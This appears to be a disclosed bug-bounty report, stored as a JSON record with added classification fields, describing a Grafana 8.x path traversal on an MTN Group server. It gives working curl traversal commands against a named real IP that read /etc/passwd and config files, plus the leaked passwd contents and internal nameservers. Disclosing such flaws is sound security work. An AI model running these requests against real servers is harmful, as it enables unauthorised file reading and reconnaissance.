{
    "reported_to": "MTN Group",
    "reported_by": "malagham ",
    "title": "path traversal vulnerability in Grafana 8.x allows \" local file read \"",
    "content": "\nHi team,\nI've found a path traversal issue in the Grafana instances hosted on the MTN platforms. With the path traversal it's possible for an unauthenticated user to read arbitrary files on the server.\nThis IP \" 41.242.91.22 \" Domain Name \" mtn.com.gn \" is for MTN Group\n<image_0>\nSteps To Reproduce:\nOpen url address : http://41.242.91.22:3000/login\n<image_1>\nFile Read server for example /etc/passwd :\nRun the following command on the mac, linux terminal\ncurl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\nRespons:\nCode 3.38 KiB\n1MacBook-Pro ~ % curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n2root:x:0:0:root:/root:/bin/bash\n3bin:x:1:1:bin:/bin:/sbin/nologin\n4daemon:x:2:2:daemon:/sbin:/sbin/nologin\n5adm:x:3:4:adm:/var/adm:/sbin/nologin\n6lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n7sync:x:5:0:sync:/sbin:/bin/sync\n8shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n9halt:x:7:0:halt:/sbin:/sbin/halt\n10mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n11operator:x:11:0:operator:/root:/sbin/nologin\n12games:x:12:100:games:/usr/games:/sbin/nologin\n13ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\n14nobody:x:99:99:Nobody:/:/sbin/nologin\n15systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\n16dbus:x:81:81:System message bus:/:/sbin/nologin\n17polkitd:x:999:998:User for polkitd:/:/sbin/nologin\n18libstoragemgmt:x:998:996:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin\n19colord:x:997:995:User for colord:/var/lib/colord:/sbin/nologin\n20rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\n21saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin\n22abrt:x:173:173::/etc/abrt:/sbin/nologin\n23rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin\n24radvd:x:75:75:radvd user:/:/sbin/nologin\n25qemu:x:107:107:qemu user:/:/sbin/nologin\n26gluster:x:995:992:GlusterFS daemons:/run/gluster:/sbin/nologin\n27chrony:x:994:991::/var/lib/chrony:/sbin/nologin\n28unbound:x:993:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin\n29rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\n30nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\n31tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\n32usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin\n33geoclue:x:992:988:User for geoclue:/var/lib/geoclue:/sbin/nologin\n34setroubleshoot:x:991:987::/var/lib/setroubleshoot:/sbin/nologin\n35pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin\n36gdm:x:42:42::/var/lib/gdm:/sbin/nologin\n37saned:x:990:984:SANE scanner daemon user:/usr/share/sane:/sbin/nologin\n38gnome-initial-setup:x:989:983::/run/gnome-initial-setup/:/sbin/nologin\n39sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\n40avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin\n41postfix:x:89:89::/var/spool/postfix:/sbin/nologin\n42ntp:x:38:38::/etc/ntp:/sbin/nologin\n43tcpdump:x:72:72::/:/sbin/nologin\n44infraop:x:1000:1000:infraop:/home/infraop:/bin/bash\n45nginx:x:988:982:Nginx web server:/var/lib/nginx:/sbin/nologin\n46armand_k:x:1001:1001::/home/armand_k:/bin/bash\n47deploy:x:1002:1002::/home/deploy:/bin/bash\n48postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash\n49memcached:x:987:980:Memcached daemon:/run/memcached:/sbin/nologin\n50redis:x:986:979:Redis Database Server:/var/lib/redis:/sbin/nologin\n51apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\n52uwayo:x:1003:1003::/home/uwayo:/bin/bash\n53mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n54mugabo:x:1004:1004::/home/mugabo:/bin/bash\n55nimble:x:985:978:user for Nimble Streamer:/etc/nimble:/sbin/nologin\n56arnold:x:1005:1005::/home/arnold:/bin/bash\n57as_ftp:x:1006:1006::/home/as_ftp:/bin/bash\n58toure:x:1007:1007::/home/toure:/bin/bash\n59mayur:x:1008:1008::/home/mayur:/bin/bash\n60prometheus:x:1009:1009::/home/prometheus:/bin/false\n61sd-agent:x:984:977:Server Density Agent User:/usr/bin/sd-agent/:/bin/bash\n62node_exporter:x:983:976::/home/node_exporter:/bin/false\n63grafana:x:982:975:grafana user:/usr/share/grafana:/sbin/nologin\n64egales:x:1010:1010::/home/egales:/bin/bash\nFile Read server /usr/share/grafana/conf/defaults.ini :\nGrafana config file\nCode 149 Bytes\n1curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Fgrafana%2Fconf%2Fdefaults.ini\n<image_2>\nFile Read server /etc/resolv.conf :\ncurl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fresolv.conf\nCode 221 Bytes\n1MacBook-Pro ~ % curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fresolv.conf\n2# Generated by NetworkManager\n3nameserver 102.176.175.67\n4nameserver 102.176.175.93\nTanke you\nImpact\nAn unauthenticated user can get access to all system files if he knows the exact path of the file.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gp9srubj893hp1e936y2iripwkcw?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-12-14_at_21.28.20.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-12-14_at_21.28.20.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5BQJWZRL%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T020057Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICjFE8RLxXd8%2F1Xgs%2BoEdx20FF5bOC7TzrBJkYAUjBRPAiEAkJxAb%2FE22v0felAABAOGkAPyriW376i0VCTvyvi7gSsquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCFkns7nSm7oyBIZyyqPBfwlwUPSDD1fhamkygCWcUnr8M%2F%2Bq7%2FDKltuEZKlOS9TXspMhIJ3E5hTDYuNbeTVONr7KxwryWuxrSX4f8GN0tsdxLqwwMe3xeRlDeCwL5bzvkAkQC42tI%2BNetQquDHn6FqvE0SFifWzrnLSzAj1x8YGsN5wN4HCcHXHRzIXXurM7rc%2B2d0tNEV%2FMwG3SvzYI3NY48RJN1vPBYm8bYujyfNdUeab5uzHrwJt67cUZemH1PvgTLmMNTZXHidx%2Fdajwz%2FTFTQIY2rdBbL%2FClZeIqtCcNXSocxu5Dv1EI4waKj%2B0HsmVeKrKE8NsqqFA%2BWxzzWDHqsCaPhIIkYwDJedYn3r8%2FSy6tPp95BMLJlqEdAVyqAWumh48lITH2AG2qcRAkYGykm7wIlS2k9XT6qlh3bQBYd86s%2BFbZuLImUyWXCwlCz3X%2BL5PcEOKlUs5UOrEmvQjW0AIvbRhpzjXpQDPMflRDnfGexwXXeHOCHIg27OcIDslHLIs5dOAGdngmzpViM%2FMl%2B8unqpnBUzO35qnm6DrMF2WYKM79juoJsYfSpjXwHZ00C7YwxR67EbKkbq7vju1pV9G9q3vUYv76WIG3MwhaxB%2BeMEOT6zVc34IUKR50b%2Bl9JIX0q4pW%2BBgE0nRVJJBVVQJpXy1kdRiBAVrqnmf%2FUE9NMXPyFTGrLphl8%2BS1eX96zf5b5u2wYZ9%2FfL5prY7DWc0ZpcofZc2n8g7qTd8kqY1VFOMANluTkjTwWe8nWBm5u5lk9a7LyFF%2FbR6GPyQSUy1mB1E7UxNHtWh5ErKY95cq%2FHnGGLc1PDSM3dLjvBbHeatA5FgG7GStHBgVhRNxFCEOKYedomeH62%2Bo1nMbmYD%2Fd49oyLp98kg%2BYwzP%2BHvwY6sQFE6hEraeMDM8Dn6W2430smojDAbvrcNorOyn%2Boe0lBTKl3tbELiIl1vKGa8LSwj3zdnExJGExEKsyFB2iVuusjqYUXe4F9b5uIKH%2F82E7f7Pbbf3fJyH62HdoAsB5uDRVsPlFrq3X%2B1wqa1mJoz5I7PO8AkBZ1jU%2FHmJYsQNqLpfWwy5jOkrGQOxRkAyUpxkogtb%2BlnXlFVtOKTtBJA94r9Tv04cs6EE5j2FtAMRzjXso%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=29cf6eb418d1615151ef55e6ed0e283125b85b5f34a0e419a15b8a3af9b4234f",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bywcgmyqxt8clpqt9cx5ht5r5dw8?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-12-14_at_21.11.01.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-12-14_at_21.11.01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5BQJWZRL%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T020057Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICjFE8RLxXd8%2F1Xgs%2BoEdx20FF5bOC7TzrBJkYAUjBRPAiEAkJxAb%2FE22v0felAABAOGkAPyriW376i0VCTvyvi7gSsquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCFkns7nSm7oyBIZyyqPBfwlwUPSDD1fhamkygCWcUnr8M%2F%2Bq7%2FDKltuEZKlOS9TXspMhIJ3E5hTDYuNbeTVONr7KxwryWuxrSX4f8GN0tsdxLqwwMe3xeRlDeCwL5bzvkAkQC42tI%2BNetQquDHn6FqvE0SFifWzrnLSzAj1x8YGsN5wN4HCcHXHRzIXXurM7rc%2B2d0tNEV%2FMwG3SvzYI3NY48RJN1vPBYm8bYujyfNdUeab5uzHrwJt67cUZemH1PvgTLmMNTZXHidx%2Fdajwz%2FTFTQIY2rdBbL%2FClZeIqtCcNXSocxu5Dv1EI4waKj%2B0HsmVeKrKE8NsqqFA%2BWxzzWDHqsCaPhIIkYwDJedYn3r8%2FSy6tPp95BMLJlqEdAVyqAWumh48lITH2AG2qcRAkYGykm7wIlS2k9XT6qlh3bQBYd86s%2BFbZuLImUyWXCwlCz3X%2BL5PcEOKlUs5UOrEmvQjW0AIvbRhpzjXpQDPMflRDnfGexwXXeHOCHIg27OcIDslHLIs5dOAGdngmzpViM%2FMl%2B8unqpnBUzO35qnm6DrMF2WYKM79juoJsYfSpjXwHZ00C7YwxR67EbKkbq7vju1pV9G9q3vUYv76WIG3MwhaxB%2BeMEOT6zVc34IUKR50b%2Bl9JIX0q4pW%2BBgE0nRVJJBVVQJpXy1kdRiBAVrqnmf%2FUE9NMXPyFTGrLphl8%2BS1eX96zf5b5u2wYZ9%2FfL5prY7DWc0ZpcofZc2n8g7qTd8kqY1VFOMANluTkjTwWe8nWBm5u5lk9a7LyFF%2FbR6GPyQSUy1mB1E7UxNHtWh5ErKY95cq%2FHnGGLc1PDSM3dLjvBbHeatA5FgG7GStHBgVhRNxFCEOKYedomeH62%2Bo1nMbmYD%2Fd49oyLp98kg%2BYwzP%2BHvwY6sQFE6hEraeMDM8Dn6W2430smojDAbvrcNorOyn%2Boe0lBTKl3tbELiIl1vKGa8LSwj3zdnExJGExEKsyFB2iVuusjqYUXe4F9b5uIKH%2F82E7f7Pbbf3fJyH62HdoAsB5uDRVsPlFrq3X%2B1wqa1mJoz5I7PO8AkBZ1jU%2FHmJYsQNqLpfWwy5jOkrGQOxRkAyUpxkogtb%2BlnXlFVtOKTtBJA94r9Tv04cs6EE5j2FtAMRzjXso%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c551f9ad93b262a1833f912469f670ff1e48dcfc8488e720d7dd6a9f899c0d67",
        "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4w26eocc0twslxovbve1rwb0i0pf?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2021-12-14_at_21.44.10.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2021-12-14_at_21.44.10.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5BQJWZRL%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T020057Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICjFE8RLxXd8%2F1Xgs%2BoEdx20FF5bOC7TzrBJkYAUjBRPAiEAkJxAb%2FE22v0felAABAOGkAPyriW376i0VCTvyvi7gSsquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCFkns7nSm7oyBIZyyqPBfwlwUPSDD1fhamkygCWcUnr8M%2F%2Bq7%2FDKltuEZKlOS9TXspMhIJ3E5hTDYuNbeTVONr7KxwryWuxrSX4f8GN0tsdxLqwwMe3xeRlDeCwL5bzvkAkQC42tI%2BNetQquDHn6FqvE0SFifWzrnLSzAj1x8YGsN5wN4HCcHXHRzIXXurM7rc%2B2d0tNEV%2FMwG3SvzYI3NY48RJN1vPBYm8bYujyfNdUeab5uzHrwJt67cUZemH1PvgTLmMNTZXHidx%2Fdajwz%2FTFTQIY2rdBbL%2FClZeIqtCcNXSocxu5Dv1EI4waKj%2B0HsmVeKrKE8NsqqFA%2BWxzzWDHqsCaPhIIkYwDJedYn3r8%2FSy6tPp95BMLJlqEdAVyqAWumh48lITH2AG2qcRAkYGykm7wIlS2k9XT6qlh3bQBYd86s%2BFbZuLImUyWXCwlCz3X%2BL5PcEOKlUs5UOrEmvQjW0AIvbRhpzjXpQDPMflRDnfGexwXXeHOCHIg27OcIDslHLIs5dOAGdngmzpViM%2FMl%2B8unqpnBUzO35qnm6DrMF2WYKM79juoJsYfSpjXwHZ00C7YwxR67EbKkbq7vju1pV9G9q3vUYv76WIG3MwhaxB%2BeMEOT6zVc34IUKR50b%2Bl9JIX0q4pW%2BBgE0nRVJJBVVQJpXy1kdRiBAVrqnmf%2FUE9NMXPyFTGrLphl8%2BS1eX96zf5b5u2wYZ9%2FfL5prY7DWc0ZpcofZc2n8g7qTd8kqY1VFOMANluTkjTwWe8nWBm5u5lk9a7LyFF%2FbR6GPyQSUy1mB1E7UxNHtWh5ErKY95cq%2FHnGGLc1PDSM3dLjvBbHeatA5FgG7GStHBgVhRNxFCEOKYedomeH62%2Bo1nMbmYD%2Fd49oyLp98kg%2BYwzP%2BHvwY6sQFE6hEraeMDM8Dn6W2430smojDAbvrcNorOyn%2Boe0lBTKl3tbELiIl1vKGa8LSwj3zdnExJGExEKsyFB2iVuusjqYUXe4F9b5uIKH%2F82E7f7Pbbf3fJyH62HdoAsB5uDRVsPlFrq3X%2B1wqa1mJoz5I7PO8AkBZ1jU%2FHmJYsQNqLpfWwy5jOkrGQOxRkAyUpxkogtb%2BlnXlFVtOKTtBJA94r9Tv04cs6EE5j2FtAMRzjXso%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e8a5b02ffb1ecef2bcdae9a697af16109ace523a77ddd38dfbb250e3f3772d45"
    },
    "disclosed_date": 1662221640,
    "report_url": "https://hackerone.com/reports/1427086",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Open URL address: http://41.242.91.22:3000/login"
        ],
        [
            2,
            "Run the curl command to exploit the path traversal vulnerability: curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        ]
    ],
    "vuln_description": "A path traversal vulnerability in Grafana 8.x allows unauthenticated users to read arbitrary files on the server by exploiting a misconfigured URL path. This can lead to unauthorized access to sensitive system files such as /etc/passwd, configuration files, and other critical data.",
    "reason": "The vulnerability is straightforward to exploit as it involves a simple path traversal technique that is well-documented and commonly known. The attack does not require multiple components, complex state manipulation, or novel logic. The tester only needs to know the correct URL path and use a standard tool like curl to exploit it.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}